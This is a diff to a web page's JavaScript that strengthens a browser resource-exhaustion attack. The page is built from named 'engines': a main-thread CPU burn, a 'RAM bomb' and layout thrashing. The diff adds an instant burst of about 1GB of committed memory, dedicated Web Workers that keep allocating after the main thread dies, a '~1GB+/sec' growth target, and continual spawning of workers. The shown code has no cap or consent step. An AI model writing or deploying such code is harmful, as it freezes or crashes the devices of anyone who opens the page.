@@ -202,9 +202,9 @@
       mark('offscreen');
     }
 
-    // ── ENGINE 2: main-thread CPU — aggressive ─────────────
-    const mainA = new Float64Array(1024 * 1024);
-    const mainB = new Float64Array(1024 * 1024);
+    // ── ENGINE 2: main-thread CPU (lighter so RAM alloc can run) ─
+    const mainA = new Float64Array(256 * 1024);
+    const mainB = new Float64Array(256 * 1024);
     function mainBurn(ms) {
       const end = performance.now() + ms;
       let x = Math.random();
@@ -311,24 +311,70 @@
     for (let i = 0; i < 60; i++) spawnDomLayer();
     mark('dom');
 
-    // ── ENGINE 7: RAM bomb — no soft cap ───────────────────
-    function eatMemory() {
+    // ── ENGINE 7: RAM bomb — dedicated workers + main burst ─
+    // Touch every OS page (4KB) so memory is COMMITTED, not just reserved.
+    function touchPages(buf) {
+      for (let i = 0; i < buf.length; i += 4096) buf[i] = i & 255;
+    }
+    function eatMemory(mb) {
+      mb = mb || 64;
       try {
-        // 16 MB chunks, keep forever
-        const chunk = new Uint8Array(16 * 1024 * 1024);
-        for (let i = 0; i < chunk.length; i += 4096) chunk[i] = i & 255;
+        const bytes = mb * 1024 * 1024;
+        const chunk = new Uint8Array(bytes);
+        touchPages(chunk);
         memChunks.push(chunk);
-        memMB += 16;
-        // also retain object graphs
-        memChunks.push({
-          a: new Float64Array(256 * 1024),
-          s: 'x'.repeat(1024 * 256),
-          nest: { deep: { arr: Array.from({ length: 10000 }, (_, i) => ({ i, v: Math.random() })) } }
-        });
-        memMB += 4;
+        memChunks.push(new Float64Array(mb * 1024 * 32)); // extra retain
+        memMB += mb + (mb * 1024 * 32 * 8) / 1048576;
+      } catch (_) {
+        // fallback smaller
+        try {
+          const chunk = new Uint8Array(16 * 1024 * 1024);
+          touchPages(chunk);
+          memChunks.push(chunk);
+          memMB += 16;
+        } catch (__) {}
+      }
+    }
+    // Instant burst ~1GB on main before loops freeze everything
+    for (let i = 0; i < 16; i++) eatMemory(64);
+    mark('ram-burst');
+
+    // Dedicated RAM workers — they keep allocating even if main thread dies
+    const ramWorkerSrc = `
+      const hold = [];
+      let mb = 0;
+      function alloc() {
+        try {
+          const u8 = new Uint8Array(64 * 1024 * 1024);
+          for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
+          hold.push(u8);
+          hold.push(new Float64Array(8 * 1024 * 1024));
+          mb += 64 + 64;
+          postMessage(mb);
+        } catch (e) {
+          try {
+            const u8 = new Uint8Array(8 * 1024 * 1024);
+            for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
+            hold.push(u8);
+            mb += 8;
+            postMessage(mb);
+          } catch (_) {}
+        }
+        setTimeout(alloc, 5);
+      }
+      alloc();
+      setInterval(alloc, 10);
+    `;
+    const ramUrl = URL.createObjectURL(new Blob([ramWorkerSrc], { type: 'application/javascript' }));
+    for (let i = 0; i < Math.max(8, cores); i++) {
+      try {
+        const rw = new Worker(ramUrl);
+        rw._mb = 0;
+        rw.onmessage = (e) => { rw._mb = e.data | 0; };
+        workers.push(rw);
       } catch (_) {}
     }
-    mark('ram');
+    mark('ram-workers');
 
     // ── ENGINE 8: layout thrash ────────────────────────────
     function thrashLayout() {
@@ -437,18 +483,23 @@
       gl.readPixels(0, 0, 64, 64, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(64 * 64 * 4));
     }
 
+    function totalRamMB() {
+      let wmb = 0;
+      for (const w of workers) if (w._mb) wmb += w._mb;
+      const heap = performance.memory ? performance.memory.usedJSHeapSize / 1048576 : 0;
+      return Math.max(memMB + wmb, heap);
+    }
+
     // ── MASTER LOOPS — stacked ─────────────────────────────
     function tick(t) {
       frames++;
-      mainBurn(28);                 // ~28ms CPU every frame
+      mainBurn(8);                  // leave room for RAM alloc
       paintCanvases();
       paintGL(glA, t, 12);
       paintGL(glB, t, 10);
       spawnDomLayer();
-      spawnDomLayer();
       if (frames % 2 === 0) thrashLayout();
-      eatMemory();
-      eatMemory();
+      eatMemory(64);
 
       stage.style.filter = `url(#chaos) contrast(${2 + Math.random() * 3}) saturate(${3 + Math.random() * 5}) hue-rotate(${frames % 360}deg) blur(${0.5 + Math.random() * 3}px)`;
       stage.style.transform = `translate3d(${Math.random()*10-5}px,${Math.random()*10-5}px,0) scale(${1.02+Math.random()*0.08}) rotate(${Math.random()*2-1}deg)`;
@@ -456,47 +507,51 @@
       if (frames % 5 === 0) {
         hud.f.textContent = frames;
         hud.d.textContent = domCount;
-        hud.m.textContent = performance.memory
-          ? (performance.memory.usedJSHeapSize / 1048576).toFixed(0)
-          : memMB;
+        hud.m.textContent = totalRamMB().toFixed(0);
         hud.w.textContent = workers.length;
       }
       requestAnimationFrame(tick);
-      requestAnimationFrame(tick); // double-schedule rAF
     }
     requestAnimationFrame(tick);
 
-    // Parallel hammers even if rAF stalls
-    setInterval(() => { mainBurn(40); eatMemory(); thrashLayout(); }, 16);
-    setInterval(() => { spawnDomLayer(); spawnDomLayer(); spawnDomLayer(); }, 20);
+    // RAM-only hammer — highest priority growth (~1GB+/sec target)
+    setInterval(() => { eatMemory(64); eatMemory(64); }, 8);
+    setInterval(() => { mainBurn(12); thrashLayout(); }, 16);
+    setInterval(() => { spawnDomLayer(); spawnDomLayer(); }, 30);
     setInterval(() => {
       document.documentElement.style.setProperty('--x', Math.random());
       void document.body.offsetHeight;
       document.body.style.zoom = String(0.97 + Math.random() * 0.06);
       document.body.style.filter = `hue-rotate(${Math.random()*360}deg)`;
-    }, 20);
+    }, 30);
 
-    // microtask flood
+    // microtask flood (lighter)
     function microFlood() {
-      for (let i = 0; i < 200; i++) {
+      for (let i = 0; i < 80; i++) {
         Promise.resolve().then(() => {
           let x = Math.random();
-          for (let j = 0; j < 50000; j++) x = Math.sin(x);
+          for (let j = 0; j < 20000; j++) x = Math.sin(x);
         });
       }
-      setTimeout(microFlood, 10);
+      setTimeout(microFlood, 20);
     }
     microFlood();
 
-    // keep spawning workers until browser refuses
+    // keep spawning CPU + RAM workers
     setInterval(() => {
       try {
         const w = new Worker(workerUrl);
         workers.push(w);
-        hud.w.textContent = workers.length;
       } catch (_) {}
-      eatMemory();
-    }, 200);
+      try {
+        const rw = new Worker(ramUrl);
+        rw._mb = 0;
+        rw.onmessage = (e) => { rw._mb = e.data | 0; };
+        workers.push(rw);
+      } catch (_) {}
+      hud.w.textContent = workers.length;
+      eatMemory(64);
+    }, 150);
 
     document.addEventListener('click', () => {
       if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
